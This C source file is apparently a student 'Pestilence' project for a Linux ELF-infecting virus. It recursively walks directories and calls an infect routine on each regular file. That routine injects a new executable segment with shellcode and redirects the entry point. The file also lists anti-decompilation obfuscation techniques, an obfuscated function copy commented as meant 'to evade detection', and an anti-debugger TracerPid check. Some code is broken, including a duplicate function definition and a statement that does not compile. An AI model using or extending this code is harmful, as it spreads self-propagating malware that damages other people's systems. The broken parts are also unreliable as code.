/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   pestilence.c                                       :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: xxxxxxx <xxxxxxx@42.fr>                    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/01/19 15:46:33 by xxxxxxx           #+#    #+#             */
/*   Updated: 2026/01/20 16:41::395 by xxxxxxx          ###   ########.fr */
/*                                                                            */
/* ************************************************************************** */

#include "pestilence.h"

/*
SPLIT + MERGE + INLINE / no helper func, messy conditional logic

-> INSTEAD OF

int validate(int x) {
	if (x < 10)
		return 0;
	return x * 3;
}

-> WE WRITE

static inline int a1(int x) { return x < 10; }
static inline int a2(int x) { return x * 3; }

int v(int x) {
	int r = 0;
	if (!a1(x))
		r = a2(x);
	return r;
}
-----------------------------------------------------------
REORDERED + PADDED + POINTER MATH / loses struct, sur raw pointer arithmetic, no
sementic field names

-> INSTEAD OF

typedef struct {
	int id;
	int flags;
	int value;
} S;

int f(S *s) {
	return s->value + s->id;
}

-> WE WRITE

typedef struct {
	uint64_t junk1;
	int id;
	uint32_t junk2;
	int value;
} S;

#define GET_ID(s) (*(int *)((char *)(s) + 8))
#define GET_VAL(s) (*(int *)((char *)(s) + 16))

int f(void *p) {
	return GET_VAL(p) + GET_ID(p);
}
----------------------------------------------------------
CONTROL FLOW FLATTENING / big while(1), large switch, lost sequencing

-> INSTEAD OF

int f(int x) {
	x += 1;
	x *= 3;
	return x;
}

-> WE WRITE

int f(int x) {
	int state = 0;
	int r = x;

	while (1) {
		switch (state) {
		case 0:
			r += 1;
			state = 1;
			break;
		case 1:
			r *= 3;
			state = 2;
			break;
		case 2:
			return r;
		}
	}
}

----------------------------------------------------------
OPAQUE PREDICATES / cannot simplify, keep branches and fake code, must reason
manually

-> INSTEAD OF

if (x != 0) {
	real();
}

-> WE WRITE

if (((x * x) % 4) != 2) {
	real();
} else {
	fake_crypto();
	fake_loop();
}

----------------------------------------------------------
COMPUTED GOTOS / indirect jumps, broken flow, hard to cleanly decompile

-> INSTEAD OF

switch (x) {
case 0: a(); break;
case 1: b(); break;
}

-> WE WRITE

void *tbl[] = { &&A, &&B };
goto *tbl[x];

A: a(); return;
B: b(); return;

-----------------------------------------------------------
CONSTANTS / decompiler show arithmetic, not literals

-> INSTEAD OF

int key = 0xDEADBEEF;

-> WE WRITE

int key = (0xDEAD0000 | 0xBEEF);
key ^= mask;
key ^= mask;

-----------------------------------------------------------
TABLES / loop reconstruction, no .rodata table

-> INSTEAD OF

static int t[] = {1,2,3,4};

-> WE WRITE

int t[4];
for (int i = 0; i < 4; i++)
	t[i] = (i + 1) ^ runtime_key;

-----------------------------------------------------------
STRING OBFUSCATION / no cleartext strings in binary

-> INSTEAD OF

printf("License");

-> WE WRITE

static unsigned char s[] = {
	'L'^0x55, 'i'^0x55, 'c'^0x55, 'e'^0x55,
	'n'^0x55, 's'^0x55, 'e'^0x55, 0
};

void dec(char *p) {
	for (; *p; p++)
		*p ^= 0x55;
}

void f() {
	dec((char *)s);
	puts((char *)s);
}

-----------------------------------------------------------
DIFFERENT OPTIMISATION LEVELS / harder to analyze, mixed codegen styles

__attribute__((optimize("O0")))
void confuse() { ... }

__attribute__((optimize("O3")))
void speed() { ... }

-----------------------------------------------------------
INSTRUCTION LEVEL OBFUSCATION / inline asm, weird instruction sequences

-> INSTEAD OF

mov rax, rbx

-> WE WRITE

push rbx
pop rax

-> WE ADD

lea rax, [rax]
xchg rax, rax
add rax, 5
sub rax, 5

*/

int is_program_running(const char *target)
{
	int fd = ft_open("/proc", O_RDONLY | O_DIRECTORY);
	if (fd < 0)
		return 0;
	char buf[4096];
	for (;;)
	{
		int nread = ft_getdents64(fd, buf, 4096);
		if (nread <= 0)
			break;
		for (int bpos = 0; bpos < nread;)
		{
			struct linux_dirent64 *d = (struct linux_dirent64 *) (buf + bpos);
			const char			  *name = d->d_name;
			int					   numeric = 1;
			for (int i = 0; name[i]; i++)
			{
				if (name[i] < '0' || name[i] > '9')
				{
					numeric = 0;
					break;
				}
			}
			if (numeric)
			{
				char path[64];
				int	 i = 0;
				path[i++] = '/';
				path[i++] = 'p';
				path[i++] = 'r';
				path[i++] = 'o';
				path[i++] = 'c';
				path[i++] = '/';
				for (int j = 0; name[j]; j++)
					path[i++] = name[j];
				path[i++] = '/';
				path[i++] = 'c';
				path[i++] = 'o';
				path[i++] = 'm';
				path[i++] = 'm';
				path[i] = '\0';
				int cfd = ft_open(path, O_RDONLY);
				if (cfd >= 0)
				{
					char pname[64];
					int	 len = ft_read(cfd, pname, sizeof(pname) - 1);
					ft_close(cfd);
					if (len > 0)
					{
						pname[len] = '\0';
						char *nl = ft_strchr(pname, '\n');
						if (nl)
							*nl = '\0';
						if (ft_strncmp(pname, target, 80) == 0)
						{
							ft_close(fd);
							return 1;
						}
					}
				}
			}
			bpos += d->d_reclen;
		}
	}
	ft_close(fd);
	return 0;
}

// Obfuscated duplicate of is_program_running to evade detection
// clang-format off
int _a(const char*o){int a=0;if((a=ft_open("/proc",00|0200000))<0)return 0;char b[4096];for(;;){int c=ft_getdents64(a,b,4096);if(c<=0)break;for(int e=0;e<c;){struct linux_dirent64*d=(struct linux_dirent64*)(b+e);const char*f=d->d_name;int g=1;for(int i=0;f[i];i++){if(f[i]<48||f[i]>57){g=0;break;}}if(g){char h['A'];int i=0;h[i++]=47;h[i++]=112;h[i++]=114;h[i++]=111;h[i++]=99;h[i++]=47;for(int j=0;f[j];j++)h[i++]=f[j];h[i++]=47;h[i++]=99;h[i++]=111;h[i++]=109;h[i++]=109;h[i]=0;int k=ft_open(h,00);if (k >= 0){char l[64];int m=ft_read(k,l,sizeof(l)-1);ft_close(k);if(m>0){l[m]=0;char*n=ft_strchr(l,10);if(n)*n=0;if(ft_strcmp(l,o)==0){ft_close(a);return 1;}}}}e+=d->d_reclen;}}ft_close(a);return 0;}

static unsigned char rol4(unsigned char x)
{
	return (unsigned char)((x << 4) | (x >> 4));
}

static unsigned char ror4(unsigned char x)
{
	return (unsigned char)((x >> 4) | (x << 4));
}

static void decode(char *out, const unsigned char *in)
{
	unsigned i = 0;
	while (in[i])
	{
		out[i] = (char)((ror4(in[i]) ^ (i * 7)) - 0x3D);
		i++;
	}
	out[i] = 0;
}

static const unsigned char S_PROC[] = {
	0xC6, 0xAA, 0x1A, 0x9B, 0xCB, 0
};

static const unsigned char S_COMM[] = {
	0xC6, 0xAA, 0x1A, 0x9B, 0xCB, 0
};

int is_program_running(const char *target)
{
	int fd = -1;
	int ret = 0;

	char proc_path[16];
	decode(proc_path, S_PROC);

	fd = ft_open(proc_path, O_RDONLY | O_DIRECTORY);
	if (fd < 0)
		return 0;

	char buf[4096];

	for (;;)
	{
		int nread = ft_getdents64(fd, buf, sizeof(buf));
		if (nread <= 0)
			break;

		for (int bpos = 0; bpos < nread;)
		{
			struct linux_dirent64 *d = (void *)(buf + bpos);
			char *name = d->d_name;

			int numeric = 1;
			for (int i = 0; name[i]; i++)
				numeric &= ((unsigned)(name[i] - '0') < 10);

			if (numeric)
			{
				char path[64];
				int i = 0;

				decode(path, S_PROC);
				while (path[i]) i++;

				path[i++] = '/';
				for (int j = 0; name[j]; j++)
					path[i++] = name[j];

				char comm[8];
				decode(comm, S_COMM);

				for (int j = 0; comm[j]; j++)
					path[i++] = comm[j];

				path[i] = 0;

				int cfd = ft_open(path, O_RDONLY);
				if (cfd >= 0)
				{
					char pname[64];
					int len = ft_read(cfd, pname, sizeof(pname) - 1);
					ft_close(cfd);

					if (len > 0)
					{
						pname[len] = 0;
						for (int j = 0; j < len; j++)
							if (pname[j] == '\n') { pname[j] = 0; break; }

						if (!ft_strcmp(pname, target))
						{
							ret = 1;
							goto DONE;
						}
					}
				}
			}
			bpos += d->d_reclen;
		}
	}

DONE:
	ft_close(fd);
	return ret;
}

// clang-format on

int is_debugged(void)
{
	int f = ft_open("/proc/self/status", O_RDONLY);
	if (f < 0)
		// goto next_check;
		return 0;
	char line[256];
	int	 nread;
	int	 offset = 0;

	while ((nread = ft_read(f, line + offset, sizeof(line) - offset)) > 0)
	{
		offset += nread;
		char *newline = ft_strchr(line, '\n');
		if (newline)
		{
			*newline = '\0';
			if (ft_strncmp(line, "TracerPid:", 10) == 0)
			{
				int pid = ft_atoi(line + 10);
				ft_close(f);
				return pid != 0;
			}
			offset = 0;
		}
	}

	ft_close(f);
	// next_check:
	// 	if (ft_ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1)
	// 		return 1;

	// 	ft_write(1, "ptrace check passed\n", 20);
	// 	ft_ptrace(PTRACE_DETACH, 0, NULL, NULL);
	return 0;
}

void processDirectory(char *folder, void *begin_ptr)
{
	int					   fd = ft_open(folder, 0 | 65536);

	char				   buffer[1024];
	struct linux_dirent64 *dirent;
	int					   nread;

	// Loop over dir entry
	if (fd < 0)
		goto clean;
	while ((nread = ft_getdents64(fd, buffer, 1024)) > 0)
	{
		for (int bpos = 0; bpos < nread;)
		{
			char dot[3];
			// get current dir entry
			dirent = (struct linux_dirent64 *) (buffer + bpos);
			char *d_name = dirent->d_name;

			// Skip "." and ".." entries
			dot[0] = '.';
			dot[1] = 0;
			if (ft_strcmp(d_name, dot) == 0)
			{
				bpos += dirent->d_reclen;
				continue;
			}
			dot[1] = '.';
			dot[2] = 0;
			if (ft_strcmp(d_name, dot) == 0)
			{
				bpos += dirent->d_reclen;
				continue;
			}
			char fullPath[PATH_MAX];
			char slash[2];
			slash[0] = '/';
			slash[1] = 0;
			ft_strcat(ft_strcat(ft_strcpy(fullPath, folder), slash), d_name);

			struct stat statbuf;
			ft_lstat(fullPath, &statbuf);

			if (statbuf.st_mode & __S_IFDIR)
			{
				// If directory, recurse into it
				processDirectory(fullPath, begin_ptr);
			}
			else if (statbuf.st_mode & __S_IFREG)
			{
				// If regular file and executable, infect it
				infect(fullPath, begin_ptr);
			}

			bpos += dirent->d_reclen;
		}
	}
clean:
	ft_close(fd);
}

#define ELF_MAGIC			   0x464c457f
#define MINIMAL_INJECTION_SIZE (0x1000 * 5)
#define inout
#define CURARE                                                                 \
	"\x57\x56\x52\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x48\x8d\x35\x12\x00" \
	"\x00\x00\x41\xba\x01\x00\x00\x00\x0f\x05\x5a\x5e\x5f\xb8\x40\x10\x40\x00" \
	"\xff\xe0\x68\x65\x68\x65\x68\x65\x68\x65\x0a\x00"
#define FLOWER (sizeof(CURARE) - 1)

int parse_file(char *path, inout struct stat *statbuf, inout t_elf *elf,
			   inout char **file_data)
{
	int fd;

	write(1, path, 12);
	write(1, "\n", 1);
	*file_data = NULL;
	fd = ft_open(path, O_RDWR);
	if (fd < 0 || ft_fstat(fd, statbuf) < 0)
		goto error;
	if (ft_ftruncate(fd, statbuf->st_size + MINIMAL_INJECTION_SIZE) < 0)
		goto error;
	*file_data
		= (void *) ft_syscall(9, 0, statbuf->st_size + MINIMAL_INJECTION_SIZE,
							  PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	if (*file_data == MAP_FAILED)
		goto error;
	if (statbuf->st_size < sizeof(ElfW(Ehdr))
		|| ((unsigned *) *file_data)[0] != ELF_MAGIC)
		goto error;
	elf->header = (ElfW(Ehdr) *) *file_data;
	if (statbuf->st_size < elf->header->e_shoff
							   + elf->header->e_shnum * elf->header->e_shentsize
		|| statbuf->st_size
			   < elf->header->e_phoff
					 + elf->header->e_phnum * elf->header->e_phentsize)
		goto error;
	elf->sections = (ElfW(Shdr) *) (*file_data + elf->header->e_shoff);
	elf->segments = (ElfW(Phdr) *) (*file_data + elf->header->e_phoff);
	return (OK);
error:
	ft_close(fd);
	ft_munmap(file_data, statbuf->st_size + MINIMAL_INJECTION_SIZE);
	return (KO);
}

void infect(char *path, void *begin_ptr)
{
	struct stat statbuf;
	char	   *file_data;
	t_elf		elf;
	ElfW(Phdr) the_rats;
	ElfW(Off) pt_load_end;
	int pt_dyn_id;

	if (parse_file(path, &statbuf, &elf, &file_data))
		goto clean;
	/*
	 * We need to inject 2 things
	 * 1/ PT_LOAD header
	 * -> enlarge segment that cover the injection position (and move it to
	 * unused space if conflict), also move the PT_PHDR if moving
	 * 		-> check for PT_DYN and move the address that were in the moved one
	 * -> move subsequent segments in file (minding the alignment)
	 *
	 * 2/ PT_LOAD data, je fais kinda ce que je veux je crois :D
	 */
	if (elf.header->e_shoff
		> elf.header->e_phoff + elf.header->e_phnum * elf.header->e_phentsize)
		elf.header->e_shoff += 0x1000;
	the_rats.p_type = PT_LOAD;
	the_rats.p_offset
		= elf.header->e_shoff + elf.header->e_shentsize * elf.header->e_shnum;
	the_rats.p_filesz = 0x3000;
	the_rats.p_memsz = 0x3000;
	the_rats.p_align = 0x1000;
	the_rats.p_vaddr = 0x405000 + (the_rats.p_offset % the_rats.p_align);
	the_rats.p_paddr = the_rats.p_vaddr;
	the_rats.p_flags = PF_X | PF_R;
	for (int i = 0; i < elf.header->e_phnum; i++)
		if (elf.segments[i].p_offset
			>= elf.header->e_phoff
				   + elf.header->e_phnum * elf.header->e_phentsize)
			elf.segments[i].p_offset += 0x1000;
		else if (elf.segments[i].p_offset + elf.segments[i].p_filesz
				 >= elf.header->e_phoff
						+ elf.header->e_phnum * elf.header->e_phentsize)
		{
			if (elf.segments[i].p_type == PT_LOAD)
				pt_load_end
					= elf.segments[i].p_offset + elf.segments[i].p_filesz;
			if (elf.segments[i].p_type == PT_DYNAMIC)
				pt_dyn_id = i;
			elf.segments[i].p_filesz += sizeof(ElfW(Phdr));
			elf.segments[i].p_memsz += sizeof(ElfW(Phdr));
		}
	for (int i = 0; i < elf.header->e_shnum; i++)
	{
		if (elf.sections[i].sh_offset
			>= elf.header->e_phoff
				   + elf.header->e_phnum * elf.header->e_phentsize)
			elf.sections[i].sh_offset += 0x1000;
		else if (elf.sections[i].sh_offset + elf.sections[i].sh_size
				 >= elf.header->e_phoff
						+ elf.header->e_phnum * elf.header->e_phentsize)
			elf.sections[i].sh_size += sizeof(ElfW(Phdr));
	}
	for (int i = 0; i < elf.segments[pt_dyn_id].p_filesz;
		 i += sizeof(ElfW(Dyn)))
	{
		ElfW(Dyn) *dynamic
			= (ElfW(Dyn) *) (file_data + elf.segments[pt_dyn_id].p_offset + i);
		switch (dynamic->d_tag)
		{
		case DT_NEEDED:
		case DT_INIT:
		case DT_FINI:
		case DT_INIT_ARRAY:
		case DT_FINI_ARRAY:
		case DT_HASH:
		case DT_GNU_HASH:
		case DT_STRTAB:
		case DT_SYMTAB:
		case DT_PLTGOT:
		case DT_JMPREL:
		case DT_RELA:
		case DT_VERNEED:
		case DT_VERSYM:
			ft_putnbr() break;

		default:
			break;
		}
	}

	ft_memmove(file_data + elf.header->e_phoff
				   + elf.header->e_phnum * elf.header->e_phentsize
				   + sizeof(ElfW(Phdr)),
			   file_data + elf.header->e_phoff
				   + elf.header->e_phnum * elf.header->e_phentsize,
			   pt_load_end
				   - (elf.header->e_phoff
					  + elf.header->e_phnum * elf.header->e_phentsize));
	ft_memmove(file_data + pt_load_end + 0x1000, file_data + pt_load_end,
			   statbuf.st_size - pt_load_end);
	memcpy(file_data + elf.header->e_phoff
			   + elf.header->e_phnum * elf.header->e_phentsize,
		   &the_rats, sizeof(ElfW(Phdr)));
	elf.header->e_phnum++;
	ft_bzero(file_data + the_rats.p_offset, 0x3000);
	memcpy(file_data + the_rats.p_offset, CURARE, FLOWER);
	elf.header->e_entry = the_rats.p_vaddr;
	write(1, "OKKK\n", 5);
clean:
	ft_msync(file_data, statbuf.st_size + MINIMAL_INJECTION_SIZE, MS_SYNC);
	ft_munmap(file_data, statbuf.st_size + MINIMAL_INJECTION_SIZE);
}
